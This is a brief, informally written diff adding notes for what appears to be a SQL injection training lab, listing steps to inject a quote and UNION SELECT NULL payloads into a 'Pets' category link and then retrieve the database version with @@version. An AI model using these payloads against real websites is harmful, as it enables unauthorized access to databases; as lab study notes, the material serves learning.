@@ -1,0 +1,6 @@
+click on Pets button
+add a ' to sitelink --> if you get en error
+type +UNION+SELECT+NULL--+ to sitelink --> if you get error again 
+add a null +UNION+SELECT+NULL,NULL--+ like this --> it don't gives you any error
+now for finding version type @@version instead of any NULL
+bottom of the site you find version and congratulations you completed the lab
